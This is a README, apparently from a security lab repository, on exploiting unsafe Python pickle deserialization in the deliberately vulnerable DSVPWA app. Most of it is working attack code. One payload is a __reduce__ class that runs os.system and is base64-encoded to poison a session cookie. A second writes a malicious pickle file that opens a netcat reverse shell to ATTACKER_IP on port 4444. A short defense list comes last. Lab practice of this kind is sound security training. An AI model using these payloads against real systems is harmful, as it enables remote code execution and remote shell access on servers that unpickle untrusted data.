# DSVPWA - Deserialization (Pickle) Exploits

## Overview
DSVPWA uses Python pickle for session storage and data serialization, which is inherently unsafe.

## Target Application
- **Project**: DSVPWA
- **Port**: 65413
- **Vulnerable Features**: Session management, data import/export
- **Vulnerability**: Unsafe pickle deserialization

## Prerequisites
```bash
cd projects/DSVPWA
python app.py
```

## Exploits

### 1. pickle_advanced.py
Advanced pickle exploitation with custom gadget chains.

**Usage:**
```bash
python3 pickle_advanced.py
```

### 2. pickle_rce.py
Direct pickle RCE payload.

**Usage:**
```bash
python3 pickle_rce.py
```

## Attack Vectors

### Session Poisoning
```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('whoami',))

# Encode malicious session
payload = base64.b64encode(pickle.dumps(RCE()))

# Replace session cookie with payload
# When server unpickles the session -> RCE!
```

### File Upload Pickle
```python
# If app allows uploading pickled data
import pickle

class Exploit:
    def __reduce__(self):
        import subprocess
        cmd = ['nc', '-e', '/bin/bash', 'ATTACKER_IP', '4444']
        return (subprocess.Popen, (cmd,))

with open('malicious.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)

# Upload malicious.pkl to the application
```

## Defense
- Replace pickle with JSON for all user-facing data
- Never unpickle untrusted data
- Use cryptographic signing for sessions
- Implement input validation

## Notes
Pickle deserialization = instant RCE. Always use JSON instead.

## References
- See `../../dataviz/deserialization/HOW_TO_USE.md` for more techniques
